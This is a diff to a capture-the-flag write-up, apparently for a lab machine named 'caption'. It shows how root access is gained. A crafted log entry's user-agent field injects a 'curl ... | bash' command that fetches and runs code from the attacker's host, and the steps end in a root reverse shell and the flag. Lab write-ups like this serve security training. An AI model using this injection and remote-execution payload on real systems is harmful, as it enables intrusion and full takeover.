@@ -1274,8 +1274,51 @@ We received successfully the curl from the victim machine.
 
 <br />
 
-```bash
+We can use the following `lois.log` to gain a console as root:
 
+<br />
+
+```bash
+10.11.12.13 "user-agent":"test'; curl http://10.10.14.13/index.html | bash #"
+```
+
+<br />
+
+We run the `client.py` again:
+
+<br />
+
+```bash
+❯ python3 client.py /home/margo/lois.log
+```
+
+<br />
+
+Then, if we check the listener there is the shell as `root`:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.11.33] 49044
+bash: cannot set terminal process group (1284): Inappropriate ioctl for device
+bash: no job control in this shell
+root@caption:~# id
+
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+<br />
+
+Finally, we can get the `root.txt` flag:
+
+<br />
+
+```bash
+root@caption:~# cat root.txt
+
+2063dc64172a376b7e7ac32b39xxxxxx
 ```
 
 <br />
